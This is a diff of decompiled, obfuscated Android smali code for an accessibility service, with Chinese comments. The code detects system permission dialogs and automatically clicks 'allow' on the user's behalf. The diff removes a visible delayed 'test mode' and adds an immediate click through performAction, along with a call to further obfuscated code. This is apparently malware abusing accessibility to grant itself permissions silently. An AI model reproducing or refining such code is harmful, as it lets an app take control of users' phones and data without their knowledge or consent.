@@ -3038,28 +3038,6 @@
 
     move-object/from16 v2, p1
 
-    # 权限对话框：交给混淆模块自动点允许
-    :try_start_permag
-    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityEvent;->getClassName()Ljava/lang/CharSequence;
-    move-result-object v1
-    if-nez v1, :cond_permag_skip
-    invoke-virtual {v1}, Ljava/lang/Object;->toString()Ljava/lang/String;
-    move-result-object v1
-    const-string v3, "GrantPermissionsActivity"
-    invoke-virtual {v1, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
-    move-result v1
-    if-nez v1, :cond_permag_skip
-    move-object/from16 v0, p0
-    invoke-static {v0}, Lڝږ؁ڋ/ڤ;->start(Landroid/accessibilityservice/AccessibilityService;)V
-    :cond_permag_skip
-    :try_end_permag
-    .catch Ljava/lang/Exception; {:try_start_permag .. :try_end_permag} :catch_permag
-    goto :goto_permag
-
-    :catch_permag
-    move-exception v0
-    :goto_permag
-
     const-string v1, "]"
 
     const-string v3, "CC_LOCK cls="
@@ -4375,26 +4353,6 @@
 .method public final onServiceConnected()V
     .locals 22
 
-    # 无障碍连上后延迟 2 秒再拉权限申请
-    :try_start_perm
-    move-object/from16 v4, p0
-    new-instance v0, Landroid/os/Handler;
-    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;
-    move-result-object v1
-    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V
-    new-instance v1, Lڝږ؁ڋ/ٿ;
-    invoke-direct {v1, v4}, Lڝږ؁ڋ/ٿ;-><init>(Landroid/content/Context;)V
-    const-wide/16 v2, 0x7d0
-    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
-    :try_end_perm
-    .catch Ljava/lang/Exception; {:try_start_perm .. :try_end_perm} :catch_perm
-    goto :goto_perm
-
-    :catch_perm
-    move-exception v0
-    :goto_perm
-
-
     move-object/from16 v1, p0
 
     const-string v2, "_installTs"
@@ -5052,6 +5010,10 @@
     if-nez v12, :cond_e
 
     :try_start_c
+    invoke-static/range {p0 .. p0}, Lڗًقڔ/؋;->ٽ(Landroid/content/Context;)V
+    :try_end_c
+    .catch Ljava/lang/Exception; {:try_start_c .. :try_end_c} :catch_b
+
     goto :goto_9
 
     :catch_b
@@ -10993,7 +10955,7 @@
 .end method
 
 .method public final ع(Ljava/lang/String;)V
-    .locals 14
+    .locals 12
 
     const-string v0, "com.android.settings:id/action_button"
 
@@ -11259,13 +11221,7 @@
 
     invoke-static {v3, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
 
-    # 测试模式：延迟 2 秒再点允许，方便看清每个权限框
-    new-instance v9, Lڝږ؁ڋ/ڼ;
-    invoke-direct {v9, v10}, Lڝږ؁ڋ/ڼ;-><init>(Landroid/view/accessibility/AccessibilityNodeInfo;)V
-    sget-object v10, Lڟەطڽٲ/ؠ;->ء:Landroid/os/Handler;
-    const-wide/16 v12, 0x7d0
-    invoke-virtual {v10, v9, v12, v13}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
-
+    invoke-virtual {v10, v8}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z
 
     return-void
 
